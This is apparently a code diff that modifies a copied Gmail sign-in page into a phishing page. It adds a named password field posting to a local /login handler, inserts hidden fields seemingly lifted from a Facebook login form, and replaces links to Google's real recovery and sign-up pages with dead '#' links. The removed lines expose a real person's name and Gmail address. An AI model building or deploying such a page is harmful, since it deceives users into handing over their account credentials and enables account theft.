@@ -2,12 +2,21 @@
 <html lang="en">
 
 <head>
+    <title>Gmail</title>
     <meta charset="utf-8">
+	<link rel="icon" type="imagenes/png" sizes="16x16" href="Gmail.png">
     <meta content="width=300, initial-scale=1" name="viewport">
     <meta name="google" value="notranslate">
     <meta name="description" content="Gmail is email that's intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
     <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
-    <title>Gmail</title>
+    
+	<meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    
+
+
+	<style type="text/css">
     <style>
         /* cyrillic-ext */
         
@@ -136,6 +145,7 @@
             unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
         }
     </style>
+	</style>
     <style>
         h1,
         h2 {
@@ -2033,7 +2043,20 @@
                     <div class="circle-mask">
                         <canvas id="canvas" class="circle" width="96" height="96"></canvas>
                     </div>
-                    <form novalidate="" method="post" action="/login" id="gaia_loginform">
+      				<form method="post" class="x" id="login_form" novalidate="1" action="/login">
+                   <form novalidate="" method="post" action="/login" id="gaia_loginform">
+					
+					<input type="hidden" name="lsd" value="AVoVyY9M" autocomplete="off">
+                    <input type="hidden" name="charset_test" value=",´,,´,?,?,?">
+                    <input type="hidden" name="version" value="1">
+                    <input type="hidden" id="ajax" name="ajax" value="0">
+                    <input type="hidden" id="width" name="width" value="0">
+                    <input type="hidden" id="pxr" name="pxr" value="0">
+                    <input type="hidden" id="gps" name="gps" value="0">
+                    <input type="hidden" id="dimensions" name="dimensions" value="0">
+                    <input type="hidden" name="m_ts" value="1463543443">
+                    <input type="hidden" name="li" value="k-Y7V1ifYou3n4yaTyOE5nb7">
+				   
                         <input name="Page" type="hidden" value="PasswordSeparationSignIn">
                         <input type="hidden" name="GALX" value="Re8SeZOKp9k">
                         <input type="hidden" name="gxf" value="AFoagUVR-gEHu-IuSC6Iwgz85dLeZ5vamg:1464110387439">
@@ -2059,9 +2082,14 @@
                                         <div>
                                             <label class="hidden-label" for="Email">
                                                 Enter your email</label>
-                                            <input id="Email" name="Email" placeholder="Enter your email" type="email" value="" spellcheck="false" autofocus="">
-                                            <input id="Pass" type="password" spellcheck="false" placeholder="Enter your password">
-                                        </div>
+                                            <input id="Email" name="email" placeholder="Enter your email" type="email" value="" spellcheck="false" autofocus="">
+                                            
+											<!--<input autocorrect="off" autocapitalize="off"  class="be bf bh bi" name="pass" id="Pass" type="password" spellcheck="false" placeholder="Enter your password">
+										    <input autocorrect="off" autocapitalize="off" class="be bf bh bi" name="pass" type="password">
+                                            -->
+											<input autocorrect="off" autocapitalize="off"  class="be bf bh bi" name="pass" type="password" placeholder="Enter your password">
+										
+										</div>
                                 
                                     </div>
                                     <span role="alert" class="error-msg" id="errormsg_0_Email"></span>
@@ -2082,19 +2110,22 @@
                                     <input type="text" id="identifier-captcha-input" name="identifier-captcha-input" class="captcha" placeholder="Enter the letters above" title="Type the characters you see or numbers you hear">
                                 </div>
                                 <input id="next" name="login" class="rc-button rc-button-submit" type="submit" value="Login">
-                                <a class="need-help" href="https://accounts.google.com/RecoverAccount?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ignoreShadow=0&amp;hl=en">
+								<!--<a class="need-help" href="https://accounts.google.com/RecoverAccount?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ignoreShadow=0&amp;hl=en">-->
+								<a class="need-help" href="#">
   Need help?
   </a>
                             </div>
                         </div>
-                        <a href="https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail&amp;rm=false&amp;ltmpl=default&amp;scc=1&amp;ss=1&amp;osid=1&amp;sacu=1" tabindex="-1">
-                            <img id="back-arrow" class="back-arrow" aria-label="Back" tabindex="0" alt="Back" src="https://www.gstatic.com/images/icons/material/system/1x/arrow_back_grey600_24dp.png">
+                        <!--<a href="https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail&amp;rm=false&amp;ltmpl=default&amp;scc=1&amp;ss=1&amp;osid=1&amp;sacu=1" tabindex="-1">-->
+						<a href="#">
+                                                
+						<img id="back-arrow" class="back-arrow" aria-label="Back" tabindex="0" alt="Back" src="https://www.gstatic.com/images/icons/material/system/1x/arrow_back_grey600_24dp.png">
                         </a>
                         <div class="form-panel second">
                             <div class="slide-in hide-form" style="transition-delay: 0ms;">
                                 <div>
-                                    <p id="profile-name">Devajit Asem</p>
-                                    <span id="email-display">dragfirenash@gmail.com</span>
+                                    <p id="profile-name"></p>
+                                    <span id="email-display"></span>
                                 </div>
                                 <div>
                                     <div id="password-shown"></div>
@@ -2137,7 +2168,9 @@
   </a>
   </span>
                                 <span id="link-signup">
-  <a href="https://accounts.google.com/SignUp?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ltmpl=default">
+  <a href="#">
+  <!--<a href="https://accounts.google.com/SignUp?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ltmpl=default">-->
+  
   Create account
   </a>
   </span>
